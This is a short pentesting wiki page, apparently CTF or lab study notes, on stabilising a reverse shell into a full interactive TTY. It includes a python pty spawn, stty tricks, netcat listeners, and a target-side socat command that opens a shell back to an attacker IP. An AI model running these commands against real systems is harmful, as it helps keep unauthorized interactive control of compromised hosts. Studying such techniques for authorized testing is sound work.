# 🧯 Shell Is Unstable

> Your reverse shell has no tab-completion, no arrow keys, dies on `Ctrl+C`, or `sudo`/`ssh` won't run. It's a **dumb (non-TTY) shell** — upgrade it. Full recipes in [[Shells]].

Related: [[Troubleshooting Methodology]] · [[Shells]] · [[Reverse Shell Cheat Sheet]]

---

## Full TTY upgrade (Linux) — the standard 4 steps
1) Spawn a PTY:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
2) Background it:
```
Ctrl+Z
```
3) Fix your local terminal, then foreground:
```bash
stty raw -echo; fg
```
4) Set the terminal type:
```bash
export TERM=xterm
```
Now arrows, tab, `Ctrl+C`, and `sudo`/`ssh` work.

## If python isn't present
```bash
script /dev/null -c bash
```
```bash
# or: /usr/bin/script -qc /bin/bash /dev/null
```
Other PTY spawns: `perl -e 'exec "/bin/bash";'`, or use `socat` both ends for a fully interactive shell.

## socat (best if available on both)
```bash
# Kali:
socat file:`tty`,raw,echo=0 tcp-listen:443
```
```bash
# target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:443
```

## Fix window size (garbled/wrapping)
On Kali (find your values with `stty size`), then in the shell:
```bash
stty rows 50 cols 200
```

## Symptom table
| Symptom | Fix |
|---|---|
| No tab/arrows | full TTY upgrade above |
| `Ctrl+C` kills the shell | after upgrade `Ctrl+C` is safe |
| `sudo: no tty present` | need a PTY → upgrade |
| Garbled/wrapping text | `export TERM=xterm`; `stty rows/cols` |
| Keeps dropping | use `socat`; prefer `rlwrap nc -lvnp` |

## Rules
- Upgrade **immediately** after catching a shell, before doing real work.
- `rlwrap nc -lvnp 443` gives history/editing even before the full upgrade.
